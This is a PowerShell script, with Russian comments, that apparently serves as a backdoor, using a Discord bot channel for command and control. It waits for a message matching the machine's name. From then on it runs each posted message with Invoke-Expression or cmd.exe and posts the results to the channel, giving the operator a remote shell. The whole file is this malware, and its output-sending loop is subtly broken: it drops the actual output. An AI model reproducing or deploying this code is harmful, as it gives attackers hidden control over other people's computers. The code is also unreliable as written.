$token = "$tk"
$chan  = "$ch"
$response = ""
$previouscmd = ""
$authenticated = 0

function PullMsg {
    try {
        $wc = [System.Net.WebClient]::new()
        $wc.Headers.Add('Authorization', "Bot $token")
        $json = $wc.DownloadString("https://discord.com/api/v9/channels/$chan/messages?limit=5")
        $msg = ($json | ConvertFrom-Json | Where-Object {!$_.author.bot} | Select-Object -First 1).content
        if ($msg) { $script:response = $msg.Trim() }
    } catch {
        Write-Warning "Ошибка получения команды: $_"
    }
}

function sendMsg {
    param([string]$Message)
    if (!$Message) { return }
    # Экранируем обратные кавычки
    $Message = $Message -replace '`', "'"
    $uri = "https://discord.com/api/v9/channels/$chan/messages"
    $payload = @{
        "content" = $Message
        "username" = "$env:COMPUTERNAME"
    }
    try {
        Invoke-RestMethod -Uri $uri -Method Post -Headers @{Authorization="Bot $token"} -ContentType "application/json" -Body ($payload | ConvertTo-Json -Compress) | Out-Null
        Write-Host "Message sent to Discord: $Message"
    } catch {
        Write-Warning "Failed sendMsg: $_"
    }
}

Function Authenticate {
    if ($response -like "$env:COMPUTERNAME") {
        $script:authenticated = 1
        $script:previouscmd = $response
        sendMsg ":white_check_mark:  **$env:COMPUTERNAME** | ``Session Started!``  :white_check_mark:"
        sendMsg "``PS | $($PWD.Path)>``"
    } else {
        $script:authenticated = 0
        $script:previouscmd = $response
    }
}

# ------------ MAIN LOOP ---------------
PullMsg
$previouscmd = $response
sendMsg ":hourglass_flowing_sand: **$env:COMPUTERNAME** | ``Session Waiting..`` :hourglass_flowing_sand:"

while ($true) {
    PullMsg
    if ($response -and $response -ne $previouscmd) {
        $previouscmd = $response
        $dir = $PWD.Path

        if ($authenticated -eq 1) {
            if ($response -eq "close") {
                sendMsg ":octagonal_sign: Session Closed."
                break
            }
            if ($response -eq "Pause") {
                $authenticated = 0
                sendMsg ":pause_button: Session Paused."
                continue
            }

            # Исполнение команды (сначала PowerShell, потом по необходимости cmd.exe)
            $output = ""
            try {
                $output = Invoke-Expression $response 2>&1 | Out-String
            } catch {
                $output = "$_"
            }

            if (-not $output.Trim()) {
                try {
                    $output = (cmd.exe /c $response 2>&1 | Out-String)
                } catch {
                    $output = "$_"
                }
            }

            $output = $output.Trim()
            if ($output) {
                $maxBatchSize = 1900
                $total = $output.Length
                for ($i=0; $i -lt $total; $i+=$maxBatchSize) {
                    $chunk = $output.Substring($i, [Math]::Min($maxBatchSize, $total - $i))
                    sendMsg "``````"
                    Start-Sleep -Milliseconds 300
                }
            } else {
                sendMsg ":white_check_mark:  ``Command Sent``  :white_check_mark:"
            }
            sendMsg "``PS | $dir>``"
        } else {
            Authenticate
        }
    }
    Start-Sleep -Seconds 5
}

